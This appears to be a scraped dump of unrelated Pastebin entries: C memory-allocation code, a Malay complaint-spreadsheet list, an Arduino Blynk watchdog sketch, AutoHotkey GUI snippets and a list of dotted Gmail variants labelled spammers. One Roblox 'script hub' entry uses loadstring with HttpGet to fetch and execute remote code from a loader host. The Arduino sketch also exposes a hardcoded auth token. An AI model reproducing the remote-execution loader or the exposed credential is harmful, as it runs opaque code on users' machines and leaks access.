    for(Uint32 xi=0; xi<x; ++xi){
      if((p2d=p3d[xi])==NULL) break;
      for(Uint32 yi=0; yi<y; ++yi){
        if((p1d=p2d[yi])==NULL) break;
        else SDL_free(p1d);
      }
    }
  case 2: p2d=Vector->p2d;
    for(Uint32 xi=0; xi<x; ++xi){
      if((p1d=p2d[xi])==NULL) break;
      else SDL_free(p1d);
    }
  case 1: SDL_free(Vector); //frees Vector->p1d too
  default: *Vector_p=NULL;
  }
  _error_:
  return returnStatus;
}


kit_coreVector* kit_coreVectorCreate(Uint32 x, Uint32 y, Uint32 z,
                                     Uint32 unit, Uint32 type_n,
                                     int* returnStatus_p)
{
  kit_coreVector* Vector=NULL;
  size_t x_size, y_size, z_size;
  void /* *p1d, */ **p2d, ***p3d;
  int returnStatus=0, dimensions=0x80000000;
  _IF_SDLERR_I(x==0,-1,;,""variable x cannot be 0"")

  //x axis
  x_size=(!y && !z) ? unit*x : sizeof(void*)*x;
  returnStatus=_kit_coreVectorRealloc(&Vector,0, 0,sizeof(kit_coreVector)+x_size);
  _IF_SDLERR_I(returnStatus,-2,;,""SDL_malloc() for x axis failed"")
  Vector->p1d=((void*)Vector) + sizeof(kit_coreVector); //array is ahead by 32B
  ++dimensions; //vector now contains an x axis

  //y axis
  _IF_SDLERR_I(y==0 && z>0,-3,;,""variable y cannot be 0 if z>0"")
  if(y>0){ ++dimensions; //vector now contains a y axis
    y_size=(!z) ? unit*y : sizeof(void*)*y;
    p2d=Vector->p2d;
    for(Uint32 xi=0; xi<x; ++xi){
      returnStatus=_kit_coreVectorRealloc(&p2d[xi],0, 0,y_size);
      _IF_SDLERR_I(returnStatus,-4,;,""SDL_malloc() for y axis failed"")
    }
  }

  //z axis
  if(z>0){ ++dimensions; //vector now contains a z axis
    z_size=unit*z; p3d=Vector->p3d;
    for(Uint32 xi=0; xi<x; ++xi){ p2d=p3d[xi];
      for(Uint32 yi=0; yi<y; ++yi){
        returnStatus=_kit_coreVectorRealloc(&p2d[yi],0, 0,z_size);
        _IF_SDLERR_I(returnStatus,-5,;,""SDL_malloc() for z axis failed"")
      }
    }
  }

  dimensions&=0x7fffffff; //unset sign bit
  Vector->type.n=type_n;
  Vector->x=x, Vector->y=y, Vector->z=z;
  Vector->unit=unit;
  _error_:
  if(Vector!=NULL){
    Vector->_dims=dimensions&3;
    if(dimensions<0) returnStatus+=kit_coreVectorDestroy(&Vector); //-=0 -> 2
  }
  if(returnStatus_p!=NULL) *returnStatus_p=returnStatus;
  return Vector;
}"
RVwnquwq,MaxHub | Auto Dodge | Perfect Untitled Boxing Game Script Pastebin,GUI_Maker_Roblox,Lua,Friday 11th of August 2023 02:47:34 AM CDT,"--Join MaxHub Discord |
loadstring(game:HttpGet(""https://api.luarmor.net/files/v3/loaders/3f4c258405c294983a9b0e113dad3de7.lua""))()"
WaB95tY1,Senarai,ayiemedia,HTML,Friday 11th of August 2023 02:24:51 AM CDT,"Senarai aduan 
13 Ogos - https://docs.google.com/spreadsheets/d/1fL8cCjRfJgOAGsSNi-0A4_MnO9BCDBboJD0hW40MJ9E/edit#gid=0
12 Ogos -  https://docs.google.com/spreadsheets/d/1pilmLlCE3iPJHtVUut20HUCEDn7dFkSq-p26qir-mjs/edit
11 Ogos - https://docs.google.com/spreadsheets/d/1tCqvpzdYc_DZVn6foD3l-f-cWoKof-4c7CsTpdLP-R4/edit
10 Ogos - https://docs.google.com/spreadsheets/d/1YJgrIgixfMlbjyaNC4iGhvSj073H5NgrElsnQDO4qH8/edit#gid=0 
9 Ogos - https://docs.google.com/spreadsheets/d/1EZmbGDayi9UcjGa1Tao15eYWYXo1-rVJ3fvfyDN588A/edit#gid=0
8 Ogos - https://docs.google.com/spreadsheets/d/1WFagMzKwl27s6dkfaQI28NJ_v58LGM-041q3xX1S1e8/edit#gid=1560368342
7 Ogos https://docs.google.com/spreadsheets/d/1ZCj2Ays9NzweXqnaaaf8Mh1lZSU2_9h0_5DcG7kWyJI/edit?usp=sharing
6 Ogos https://docs.google.com/spreadsheets/d/1IDuyxgwOJmUQMUwcacgJHLx1XFsJuIhZMWC8CAwXWOo/edit?usp=sharing
5 Ogos https://docs.google.com/spreadsheets/d/1SfTSVhAXN1b-1S-HdGNj8YkpBgDDZeIppoVJqCspF7c/edit?usp=sharing
4 Ogos https://docs.google.com/spreadsheets/d/1nKwpuHVqitYF1TjRLxfDGRTfXFFIXX4UUnfkoN-f_Lw/edit?usp=sharing
3 Ogos https://docs.google.com/spreadsheets/d/1T7eoeWq9EkxKVosoMssw5V9rgfWMBbqU-Sz1Y0fjmMA/edit?usp=sharing
2 Ogos https://docs.google.com/spreadsheets/d/1kpguanVdtTJq9K-ic6m1zcwdqNUw7FoWCLDY8v1bUqc/edit?usp=sharing
1 Ogos - https://docs.google.com/spreadsheets/d/1i2rctZeNH6mdFc_SWK3wVmLc8ITNAKfLPmY1qhQ6esQ/edit?usp=sharing
31 Julai - https://docs.google.com/spreadsheets/d/1r9SEKs3_gShF_r8IjY7d-KkERAsJotoHFbOD9jXK83c/edit?usp=sharing
30 Julai - https://docs.google.com/spreadsheets/d/1Y7Fw0zgFTlOFTwZfZpKgepsb_Dltv-G4nNMUfLLiCf0/edit?usp=sharing
29 Julai - https://docs.google.com/spreadsheets/d/1kUlyrERRUcAbwJEygi50QB3SqI2Ver55SgnRDPeIkyg/edit?usp=sharing
28 Julai - https://docs.google.com/spreadsheets/d/1YKlHK4JXMJjGKofBYgnuE6qB5yoYq87L5_mKySnsGu4/edit?usp=sharing
27 Julai -https://docs.google.com/spreadsheets/d/1mtELxP1qvR_1khmP4EzB-UWGwZc9AvEIzFQfob0I-I4/edit?usp=sharing
26 Julai - https://docs.google.com/spreadsheets/d/14u1d5To_ypUvyEjQbj7KRzRbSosaWnXFurlBC40oPY8/edit#gid=0
25 Julai -https://docs.google.com/spreadsheets/d/1uB_uIShXPoGw7D5JLRpi72UmX25IdVKIo7TCMdsbM8k/edit#gid=0
24 Julai https://docs.google.com/spreadsheets/d/1TicBTRevNFMrUnxmzdQIQeS0qeqo7KGJtItunTm1R1Q/edit?usp=sharing"
uzhE23R2,blynk_watchdog,mikroavr,Arduino,Friday 11th of August 2023 02:22:02 AM CDT,"#define RXD2 26
#define TXD2 27

#define PKEY 14
#define RST 12

#define TINY_GSM_MODEM_SIM7600
#define BLYNK_TEMPLATE_ID ""TMPLE1aPZJfE""
#define BLYNK_TEMPLATE_NAME ""Solar_Tracker""
#define BLYNK_AUTH_TOKEN ""aoZ95-IDwV16oVP3N9TChD36QmmPWMRz""

#define BLYNK_PRINT Serial
#define SerialMon Serial
#define SerialAT Serial2
#include <TinyGsmClient.h>
#include <BlynkSimpleTinyGSM.h>
TinyGsm modem(SerialAT);

unsigned long cur_time_res, old_time_res;
unsigned long cur_time, old_time;
bool hold = 0;

#define TINY_GSM_MODEM_SIM7600
#if !defined(TINY_GSM_RX_BUFFER)
#define TINY_GSM_RX_BUFFER 650
#endif
#define TINY_GSM_DEBUG SerialMon
// set GSM PIN, if any
#define GSM_PIN """"

// Your GPRS credentials, if any
char apn[]  = ""Internet"";
char user[] = """";
char pass[] = """";

int counter = 0;
int count_con = 0;

#define WATCHDOG_TIMEOUT_S 20 // restart jika tidak ada respon 5detik
hw_timer_t * watchDogTimer = NULL;

void IRAM_ATTR watchDogInterrupt() {
  Serial.println(""reboot"");
  ESP.restart();
}

void watchDogRefresh()
{
  timerWrite(watchDogTimer, 0);                    //reset timer (feed watchdog)
}

void setup() {
  // put your setup code here, to run once:

  delay(100);
  Serial.begin(115200);
  SerialAT.begin(115200, SERIAL_8N1, RXD2, TXD2);

  pinMode(RST, OUTPUT);
  pinMode(PKEY, OUTPUT);

  digitalWrite(PKEY, LOW);
  digitalWrite(RST, LOW);
  delay(1000);
  digitalWrite(PKEY, HIGH);
  digitalWrite(RST, HIGH);
  delay(1000);
  digitalWrite(PKEY, LOW);
  digitalWrite(RST, LOW);
  delay(1000);

  SerialMon.println(""Initializing modem..."");
  modem.restart();
  String modemInfo = modem.getModemInfo();
  Serial.print(""Modem Info: "");
  Serial.println(modemInfo);

  Blynk.begin(BLYNK_AUTH_TOKEN, modem, apn, user, pass);
  delay(100);

}

void loop() {
  // put your main code here, to run repeatedly:
  Blynk.run();

  cur_time_res = millis();
  if (cur_time_res - old_time_res >= 1000) {
    watchDogRefresh();

    old_time_res = millis();
  }



  cur_time = millis();
  if (cur_time - old_time >= 4000) {
    //baca_pzem();
    Blynk.virtualWrite(V3, counter);
    counter ++;
    if (counter == 1500) {
      counter = 0;
    }
    bool check_con = Blynk.connected();
    Serial.print(""connected: "" );
    Serial.println(check_con);
    if (check_con == false) {
      count_con++;
      if (count_con == 20) {
        Serial.print(""disconnect: "");
        Serial.println(count_con);
        reset_sim();
        wakeup_sim();
      }
    }
    old_time = millis();
  }
}

void reset_sim() {
  digitalWrite(RST, HIGH);
}

void wakeup_sim() {
  SerialMon.println(""wakeup sim7600"");
  digitalWrite(PKEY, LOW);
  digitalWrite(RST, LOW);
  delay(1000);
  digitalWrite(PKEY, HIGH);
  digitalWrite(RST, HIGH);
  delay(1000);
  digitalWrite(PKEY, LOW);
  digitalWrite(RST, LOW);
  delay(1000);
  wRespon(15000);
}

void wRespon(long waktu) {
  cur_time_res = millis();
  old_time_res = cur_time_res;
  while (cur_time_res - old_time_res < waktu ) {
    cur_time_res = millis();
    while (SerialAT.available() > 0) {
      SerialMon.print(SerialAT.readString());
    }
  }
}"
QN6JDAhy,Untitled,sashaatx,Autohotkey,Friday 11th of August 2023 02:00:43 AM CDT,"
#Requires Autohotkey v2
;AutoGUI 2.5.8 creator: Alguimist autohotkey.com/boards/viewtopic.php?f=64&t=89901
;AHKv2converter creator: github.com/mmikeww/AHK-v2-script-converter
;Easy_AutoGUI_for_AHKv2 github.com/samfisherirl/Easy-Auto-GUI-for-AHK-v2

myGuiObj := myClass.UI()
; myGuiObj.Destroy()

class myClass
{
	static UI()
	{
		myGUI := Gui()
		ogcButtonOK := myGui.Add(""Button"", ""x8 y8 w80 h23"", ""&OK"")
		ogcButtonOK.OnEvent(""Click"", OnEventHandler)
		myGui.OnEvent('Close', (*) => ExitApp())
		myGui.Title := ""Window""
		myGui.Show(""w120 h46"")
					
		OnEventHandler(*)
		{
			ToolTip(""Click! This is a sample action.`n""
			. ""Active GUI element values include:`n""  
			. ""ogcButtonOK => "" ogcButtonOK.Text ""`n"", 77, 277)
			SetTimer () => ToolTip(), -3000 ; tooltip timer
		}
		return myGui
	}
}

"
d5Ky9YBn,Untitled,sashaatx,Autohotkey,Friday 11th of August 2023 02:00:04 AM CDT,"MenuHelpAbout(*)
{
    About := Gui(""+owner"" MyGui.Hwnd)  ; Make the main window the owner of the ""about box"".
    MyGui.Opt(""+Disabled"")  ; Disable main window.
    About.Add(""Text"",, ""Text for about box."")
    About.Add(""Button"", ""Default"", ""OK"").OnEvent(""Click"", About_Close)
    About.OnEvent(""Close"", About_Close)
    About.OnEvent(""Escape"", About_Close)
    About.Show()

    About_Close(*)
    {
        MyGui.Opt(""-Disabled"")  ; Re-enable the main window (must be done prior to the next step).
        About.Destroy()  ; Destroy the about box.
    }
}"
JEB9mEeb,Untitled,sashaatx,Autohotkey,Friday 11th of August 2023 01:59:12 AM CDT,"myGui := Gui()
ogcButtonOK := myGui.Add(""Button"", ""x8 y8 w80 h23"", ""&OK"")
ogcButtonOK.OnEvent(""Click"", OnEventHandler)
myGui.OnEvent('Close', (*) => ExitApp())
myGui.Title := ""Window""
myGui.Show(""w120 h46"")

OnEventHandler(*)
{
	ToolTip(""Click! This is a sample action.`n""
	. ""Active GUI element values include:`n""  
	. ""ogcButtonOK => "" ogcButtonOK.Text ""`n"", 77, 277)
	SetTimer () => ToolTip(), -3000 ; tooltip timer
}
"
5FXDuidT,Spammers and Scammers [8-2/2023],bombaires,HTML,Friday 11th of August 2023 12:54:01 AM CDT,"<a href=""mailto:joseargudoblanco@gmail.com"">joseargudoblanco@gmail.com</a>
<a href=""mailto:j.o.se.a.rg.udo.b.l.a.n.c.o@gmail.com"">j.o.se.a.rg.udo.b.l.a.n.c.o@gmail.com</a>
<a href=""mailto:j.osea.r.gu.d.oblanco@gmail.com"">j.osea.r.gu.d.oblanco@gmail.com</a>
<a href=""mailto:jo.sea.rg.ud.ob.l.a.n.co@gmail.com"">jo.sea.rg.ud.ob.l.a.n.co@gmail.com</a>
<a href=""mailto:j.osea.rgud.oblanco@gmail.com"">j.osea.rgud.oblanco@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.dobl.a.nco@gmail.com"">jo.se.a.r.g.u.dobl.a.nco@gmail.com</a>
<a href=""mailto:j.os.e.a.r.gud.o.b.l.an.c.o@gmail.com"">j.os.e.a.r.gud.o.b.l.an.c.o@gmail.com</a>
<a href=""mailto:josea.rg.u.d.o.b.lan.co@gmail.com"">josea.rg.u.d.o.b.lan.co@gmail.com</a>
<a href=""mailto:j.os.e.a.rgu.do.bl.a.n.c.o@gmail.com"">j.os.e.a.rgu.do.bl.a.n.c.o@gmail.com</a>
<a href=""mailto:jo.sea.rg.udo.b.l.a.n.c.o@gmail.com"">jo.sea.rg.udo.b.l.a.n.c.o@gmail.com</a>
<a href=""mailto:jo.se.a.rg.u.d.o.bl.a.nc.o@gmail.com"">jo.se.a.rg.u.d.o.bl.a.nc.o@gmail.com</a>
<a href=""mailto:j.o.sea.r.g.udobla.n.c.o@gmail.com"">j.o.sea.r.g.udobla.n.c.o@gmail.com</a>
<a href=""mailto:j.o.se.arg.u.dobla.n.co@gmail.com"">j.o.se.arg.u.dobla.n.co@gmail.com</a>
<a href=""mailto:j.o.s.e.arg.udoblanco@gmail.com"">j.o.s.e.arg.udoblanco@gmail.com</a>
<a href=""mailto:jo.sear.g.udobl.an.c.o@gmail.com"">jo.sear.g.udobl.an.c.o@gmail.com</a>
<a href=""mailto:j.o.se.ar.g.u.dobl.a.n.c.o@gmail.com"">j.o.se.ar.g.u.dobl.a.n.c.o@gmail.com</a>
<a href=""mailto:j.o.se.a.r.gudo.blanco@gmail.com"">j.o.se.a.r.gudo.blanco@gmail.com</a>
<a href=""mailto:josear.gud.ob.la.n.c.o@gmail.com"">josear.gud.ob.la.n.c.o@gmail.com</a>
<a href=""mailto:j.os.ear.gu.d.o.bl.a.n.c.o@gmail.com"">j.os.ear.gu.d.o.bl.a.n.c.o@gmail.com</a>
<a href=""mailto:jo.se.ar.g.udo.b.la.n.c.o@gmail.com"">jo.se.ar.g.udo.b.la.n.c.o@gmail.com</a>
<a href=""mailto:j.os.e.arg.u.do.b.l.an.co@gmail.com"">j.os.e.arg.u.do.b.l.an.co@gmail.com</a>
<a href=""mailto:jos.ea.r.gud.obl.an.c.o@gmail.com"">jos.ea.r.gud.obl.an.c.o@gmail.com</a>
<a href=""mailto:j.os.e.a.rgu.d.o.bla.nco@gmail.com"">j.os.e.a.rgu.d.o.bla.nco@gmail.com</a>
<a href=""mailto:jo.s.e.a.r.gud.obl.a.nco@gmail.com"">jo.s.e.a.r.gud.obl.a.nco@gmail.com</a>
<a href=""mailto:j.o.sear.gudobl.a.nc.o@gmail.com"">j.o.sear.gudobl.a.nc.o@gmail.com</a>
<a href=""mailto:j.o.sea.rg.u.d.o.bl.an.co@gmail.com"">j.o.sea.rg.u.d.o.bl.an.co@gmail.com</a>
<a href=""mailto:josearg.ud.obl.a.n.co@gmail.com"">josearg.ud.obl.a.n.co@gmail.com</a>
<a href=""mailto:j.osea.r.g.ud.o.bl.anco@gmail.com"">j.osea.r.g.ud.o.bl.anco@gmail.com</a>
<a href=""mailto:j.o.se.a.rg.u.do.blan.c.o@gmail.com"">j.o.se.a.rg.u.do.blan.c.o@gmail.com</a>
<a href=""mailto:j.os.ea.rgud.oblanco@gmail.com"">j.os.ea.rgud.oblanco@gmail.com</a>
<a href=""mailto:jo.s.ea.r.gu.do.bl.a.nco@gmail.com"">jo.s.ea.r.gu.do.bl.a.nco@gmail.com</a>
<a href=""mailto:jos.e.argudo.bl.a.nco@gmail.com"">jos.e.argudo.bl.a.nco@gmail.com</a>
<a href=""mailto:j.os.e.a.rgud.obl.a.n.co@gmail.com"">j.os.e.a.rgud.obl.a.n.co@gmail.com</a>
<a href=""mailto:j.o.seargu.d.ob.lan.co@gmail.com"">j.o.seargu.d.ob.lan.co@gmail.com</a>
<a href=""mailto:j.os.ea.r.g.udo.b.la.n.co@gmail.com"">j.os.ea.r.g.udo.b.la.n.co@gmail.com</a>
<a href=""mailto:jo.s.e.argud.o.b.la.nco@gmail.com"">jo.s.e.argud.o.b.la.nco@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.udo.b.l.a.n.c.o@gmail.com"">jo.se.a.r.g.udo.b.l.a.n.c.o@gmail.com</a>
<a href=""mailto:jo.s.eargu.d.o.bl.anco@gmail.com"">jo.s.eargu.d.o.bl.anco@gmail.com</a>
<a href=""mailto:j.os.e.a.r.g.ud.obla.nc.o@gmail.com"">j.os.e.a.r.g.ud.obla.nc.o@gmail.com</a>
<a href=""mailto:j.o.s.e.a.r.gu.d.ob.la.n.co@gmail.com"">j.o.s.e.a.r.gu.d.ob.la.n.co@gmail.com</a>
<a href=""mailto:j.o.se.ar.g.udobl.anco@gmail.com"">j.o.se.ar.g.udobl.anco@gmail.com</a>
<a href=""mailto:jo.seargu.d.ob.lanc.o@gmail.com"">jo.seargu.d.ob.lanc.o@gmail.com</a>
<a href=""mailto:jose.a.rgud.o.bl.an.c.o@gmail.com"">jose.a.rgud.o.bl.an.c.o@gmail.com</a>
<a href=""mailto:jo.sea.rg.u.d.o.b.l.anc.o@gmail.com"">jo.sea.rg.u.d.o.b.l.anc.o@gmail.com</a>
<a href=""mailto:josear.gu.d.obl.anco@gmail.com"">josear.gu.d.obl.anco@gmail.com</a>
<a href=""mailto:j.o.se.ar.gud.ob.l.a.nco@gmail.com"">j.o.se.ar.gud.ob.l.a.nco@gmail.com</a>
<a href=""mailto:j.o.sea.rg.u.do.blan.c.o@gmail.com"">j.o.sea.rg.u.do.blan.c.o@gmail.com</a>
<a href=""mailto:jo.sea.r.g.udob.lanc.o@gmail.com"">jo.sea.r.g.udob.lanc.o@gmail.com</a>
<a href=""mailto:j.o.se.a.rgu.dob.la.n.co@gmail.com"">j.o.se.a.rgu.dob.la.n.co@gmail.com</a>
<a href=""mailto:jo.s.ea.rg.udob.l.a.n.co@gmail.com"">jo.s.ea.rg.udob.l.a.n.co@gmail.com</a>
<a href=""mailto:j.o.se.a.r.g.udobla.n.c.o@gmail.com"">j.o.se.a.r.g.udobla.n.c.o@gmail.com</a>
<a href=""mailto:jo.s.ea.rg.u.do.bla.nc.o@gmail.com"">jo.s.ea.rg.u.do.bla.nc.o@gmail.com</a>
<a href=""mailto:jose.a.rgu.dobla.n.c.o@gmail.com"">jose.a.rgu.dobla.n.c.o@gmail.com</a>
<a href=""mailto:jo.s.ea.rgud.o.b.la.n.co@gmail.com"">jo.s.ea.rgud.o.b.la.n.co@gmail.com</a>
<a href=""mailto:jose.a.rgu.do.b.la.n.co@gmail.com"">jose.a.rgu.do.b.la.n.co@gmail.com</a>
<a href=""mailto:jos.e.a.r.gudo.b.lanc.o@gmail.com"">jos.e.a.r.gudo.b.lanc.o@gmail.com</a>
<a href=""mailto:josea.rg.udo.blan.co@gmail.com"">josea.rg.udo.blan.co@gmail.com</a>
<a href=""mailto:j.o.s.e.ar.g.ud.oblanc.o@gmail.com"">j.o.s.e.ar.g.ud.oblanc.o@gmail.com</a>
<a href=""mailto:j.os.e.argud.o.b.la.n.c.o@gmail.com"">j.os.e.argud.o.b.la.n.c.o@gmail.com</a>
<a href=""mailto:j.os.e.ar.g.u.d.ob.lan.co@gmail.com"">j.os.e.ar.g.u.d.ob.lan.co@gmail.com</a>
<a href=""mailto:jo.s.ea.r.g.udo.blan.co@gmail.com"">jo.s.ea.r.g.udo.blan.co@gmail.com</a>
<a href=""mailto:jo.se.argudo.bla.n.c.o@gmail.com"">jo.se.argudo.bla.n.c.o@gmail.com</a>
<a href=""mailto:jo.s.earg.u.dobla.nco@gmail.com"">jo.s.earg.u.dobla.nco@gmail.com</a>
<a href=""mailto:jo.se.ar.gudo.b.la.nc.o@gmail.com"">jo.se.ar.gudo.b.la.nc.o@gmail.com</a>
<a href=""mailto:jos.ear.gud.ob.l.a.nc.o@gmail.com"">jos.ear.gud.ob.l.a.nc.o@gmail.com</a>
<a href=""mailto:j.o.s.e.arg.u.d.ob.l.anco@gmail.com"">j.o.s.e.arg.u.d.ob.l.anco@gmail.com</a>
<a href=""mailto:jose.ar.gu.d.obla.nc.o@gmail.com"">jose.ar.gu.d.obla.nc.o@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.do.bl.an.c.o@gmail.com"">jo.se.a.r.g.u.do.bl.an.c.o@gmail.com</a>
<a href=""mailto:jos.ea.r.gu.dobl.a.nc.o@gmail.com"">jos.ea.r.gu.dobl.a.nc.o@gmail.com</a>
<a href=""mailto:jos.e.ar.gudob.l.a.n.co@gmail.com"">jos.e.ar.gudob.l.a.n.co@gmail.com</a>
<a href=""mailto:jo.sea.rgudob.lanc.o@gmail.com"">jo.sea.rgudob.lanc.o@gmail.com</a>
<a href=""mailto:jos.ea.rg.ud.ob.lanc.o@gmail.com"">jos.ea.rg.ud.ob.lanc.o@gmail.com</a>
<a href=""mailto:j.os.e.argu.d.o.bl.an.co@gmail.com"">j.os.e.argu.d.o.bl.an.co@gmail.com</a>
<a href=""mailto:j.os.e.ar.gud.ob.lan.co@gmail.com"">j.os.e.ar.gud.ob.lan.co@gmail.com</a>
<a href=""mailto:j.ose.a.rg.ud.ob.l.anco@gmail.com"">j.ose.a.rg.ud.ob.l.anco@gmail.com</a>
<a href=""mailto:jos.eargudobl.a.n.co@gmail.com"">jos.eargudobl.a.n.co@gmail.com</a>
<a href=""mailto:jose.a.rg.u.d.o.blan.c.o@gmail.com"">jose.a.rg.u.d.o.blan.c.o@gmail.com</a>
<a href=""mailto:j.o.s.ea.rg.udobl.a.n.c.o@gmail.com"">j.o.s.ea.rg.udobl.a.n.c.o@gmail.com</a>
<a href=""mailto:j.osear.g.udo.bl.an.co@gmail.com"">j.osear.g.udo.bl.an.co@gmail.com</a>
<a href=""mailto:j.o.se.a.rg.u.d.ob.l.anco@gmail.com"">j.o.se.a.rg.u.d.ob.l.anco@gmail.com</a>
<a href=""mailto:jose.a.rg.udo.b.la.n.co@gmail.com"">jose.a.rg.udo.b.la.n.co@gmail.com</a>
<a href=""mailto:j.o.s.e.a.rgu.do.b.lanco@gmail.com"">j.o.s.e.a.rgu.do.b.lanco@gmail.com</a>
<a href=""mailto:j.o.s.eargu.dob.la.nc.o@gmail.com"">j.o.s.eargu.dob.la.nc.o@gmail.com</a>
<a href=""mailto:jo.se.a.rg.u.dobl.a.nco@gmail.com"">jo.se.a.rg.u.dobl.a.nco@gmail.com</a>
<a href=""mailto:jos.ea.r.g.udoblan.co@gmail.com"">jos.ea.r.g.udoblan.co@gmail.com</a>
<a href=""mailto:jo.s.ear.g.u.do.bl.anco@gmail.com"">jo.s.ear.g.u.do.bl.anco@gmail.com</a>
<a href=""mailto:j.os.e.ar.gu.d.o.b.lan.c.o@gmail.com"">j.os.e.ar.gu.d.o.b.lan.c.o@gmail.com</a>
<a href=""mailto:jo.sea.rgudobla.n.co@gmail.com"">jo.sea.rgudobla.n.co@gmail.com</a>
<a href=""mailto:j.os.earg.u.do.b.la.nco@gmail.com"">j.os.earg.u.do.b.la.nco@gmail.com</a>
<a href=""mailto:jo.s.e.a.r.gu.do.b.lan.co@gmail.com"">jo.s.e.a.r.gu.do.b.lan.co@gmail.com</a>
<a href=""mailto:j.o.sea.rgu.dob.l.anco@gmail.com"">j.o.sea.rgu.dob.l.anco@gmail.com</a>
<a href=""mailto:jo.s.ea.rg.udobla.n.c.o@gmail.com"">jo.s.ea.rg.udobla.n.c.o@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.d.o.bl.anco@gmail.com"">jo.se.a.r.g.u.d.o.bl.anco@gmail.com</a>
<a href=""mailto:j.os.e.ar.g.udo.b.la.n.co@gmail.com"">j.os.e.ar.g.udo.b.la.n.co@gmail.com</a>
<a href=""mailto:jo.sea.r.g.udo.blanc.o@gmail.com"">jo.sea.r.g.udo.blanc.o@gmail.com</a>
<a href=""mailto:jose.a.r.gu.do.bla.n.c.o@gmail.com"">jose.a.r.gu.do.bla.n.c.o@gmail.com</a>
<a href=""mailto:jo.se.arg.u.d.o.bla.nc.o@gmail.com"">jo.se.arg.u.d.o.bla.nc.o@gmail.com</a>
<a href=""mailto:jo.sear.g.udo.b.lan.c.o@gmail.com"">jo.sear.g.udo.b.lan.c.o@gmail.com</a>
<a href=""mailto:jo.sea.rg.udobla.nc.o@gmail.com"">jo.sea.rg.udobla.nc.o@gmail.com</a>
<a href=""mailto:jo.s.e.ar.gudo.b.l.anco@gmail.com"">jo.s.e.ar.gudo.b.l.anco@gmail.com</a>
<a href=""mailto:j.os.e.argu.d.ob.la.n.c.o@gmail.com"">j.os.e.argu.d.ob.la.n.c.o@gmail.com</a>
<a href=""mailto:jos.e.ar.g.u.dob.la.nc.o@gmail.com"">jos.e.ar.g.u.dob.la.nc.o@gmail.com</a>
<a href=""mailto:jo.se.ar.gu.dobl.a.n.c.o@gmail.com"">jo.se.ar.gu.dobl.a.n.c.o@gmail.com</a>
<a href=""mailto:j.oseargudob.lan.c.o@gmail.com"">j.oseargudob.lan.c.o@gmail.com</a>
<a href=""mailto:jos.e.ar.gu.dob.l.anco@gmail.com"">jos.e.ar.gu.dob.l.anco@gmail.com</a>
<a href=""mailto:j.osea.rg.udo.b.la.n.c.o@gmail.com"">j.osea.rg.udo.b.la.n.c.o@gmail.com</a>
<a href=""mailto:j.o.se.a.rgudo.b.l.anc.o@gmail.com"">j.o.se.a.rgudo.b.l.anc.o@gmail.com</a>
<a href=""mailto:jo.s.ear.g.u.d.o.b.la.n.c.o@gmail.com"">jo.s.ear.g.u.d.o.b.la.n.c.o@gmail.com</a>
<a href=""mailto:j.os.ea.rg.udob.lan.c.o@gmail.com"">j.os.ea.rg.udob.lan.c.o@gmail.com</a>
<a href=""mailto:j.osear.g.udob.l.a.nco@gmail.com"">j.osear.g.udob.l.a.nco@gmail.com</a>
<a href=""mailto:j.o.s.ea.r.g.u.d.ob.l.a.n.c.o@gmail.com"">j.o.s.ea.r.g.u.d.ob.l.a.n.c.o@gmail.com</a>
<a href=""mailto:j.ose.arg.ud.ob.l.a.n.co@gmail.com"">j.ose.arg.ud.ob.l.a.n.co@gmail.com</a>
<a href=""mailto:jose.argud.o.bl.anc.o@gmail.com"">jose.argud.o.bl.anc.o@gmail.com</a>
<a href=""mailto:jo.se.ar.gudob.la.nco@gmail.com"">jo.se.ar.gudob.la.nco@gmail.com</a>
<a href=""mailto:j.o.s.e.ar.gu.d.o.bla.n.co@gmail.com"">j.o.s.e.ar.gu.d.o.bla.n.co@gmail.com</a>
<a href=""mailto:j.o.sea.rg.u.d.ob.l.anco@gmail.com"">j.o.sea.rg.u.d.ob.l.anco@gmail.com</a>
<a href=""mailto:josea.rg.u.d.obl.anc.o@gmail.com"">josea.rg.u.d.obl.anc.o@gmail.com</a>
<a href=""mailto:jo.searg.udo.bla.n.co@gmail.com"">jo.searg.udo.bla.n.co@gmail.com</a>
<a href=""mailto:jo.s.eargud.ob.lanc.o@gmail.com"">jo.s.eargud.ob.lanc.o@gmail.com</a>
<a href=""mailto:j.o.sea.rgu.do.b.lanc.o@gmail.com"">j.o.sea.rgu.do.b.lanc.o@gmail.com</a>
<a href=""mailto:jos.ea.r.g.u.dobl.anco@gmail.com"">jos.ea.r.g.u.dobl.anco@gmail.com</a>
<a href=""mailto:j.o.se.argud.ob.lanc.o@gmail.com"">j.o.se.argud.ob.lanc.o@gmail.com</a>
<a href=""mailto:jose.a.rgud.o.b.lan.c.o@gmail.com"">jose.a.rgud.o.b.lan.c.o@gmail.com</a>
<a href=""mailto:jos.ear.gu.d.o.bla.nc.o@gmail.com"">jos.ear.gu.d.o.bla.nc.o@gmail.com</a>
<a href=""mailto:j.o.s.e.a.r.gud.obl.a.nc.o@gmail.com"">j.o.s.e.a.r.gud.obl.a.nc.o@gmail.com</a>
<a href=""mailto:j.o.sea.rgudob.lan.co@gmail.com"">j.o.sea.rgudob.lan.co@gmail.com</a>
<a href=""mailto:josear.gu.d.o.b.l.anc.o@gmail.com"">josear.gu.d.o.b.l.anc.o@gmail.com</a>
<a href=""mailto:j.o.se.a.r.gu.do.blanco@gmail.com"">j.o.se.a.r.gu.do.blanco@gmail.com</a>
<a href=""mailto:jos.ear.gud.o.bl.a.nc.o@gmail.com"">jos.ear.gud.o.bl.a.nc.o@gmail.com</a>
<a href=""mailto:j.os.ear.g.udo.bl.an.co@gmail.com"">j.os.ear.g.udo.bl.an.co@gmail.com</a>
<a href=""mailto:jo.s.ear.g.udo.blan.co@gmail.com"">jo.s.ear.g.udo.blan.co@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.d.oblan.co@gmail.com"">jo.se.a.r.g.u.d.oblan.co@gmail.com</a>
<a href=""mailto:jo.sea.rg.u.dob.l.a.nco@gmail.com"">jo.sea.rg.u.dob.l.a.nco@gmail.com</a>
<a href=""mailto:j.osea.r.g.ud.o.bla.nco@gmail.com"">j.osea.r.g.ud.o.bla.nco@gmail.com</a>
<a href=""mailto:j.o.sea.rgu.doblanco@gmail.com"">j.o.sea.rgu.doblanco@gmail.com</a>
<a href=""mailto:j.os.ear.g.udo.blanc.o@gmail.com"">j.os.ear.g.udo.blanc.o@gmail.com</a>
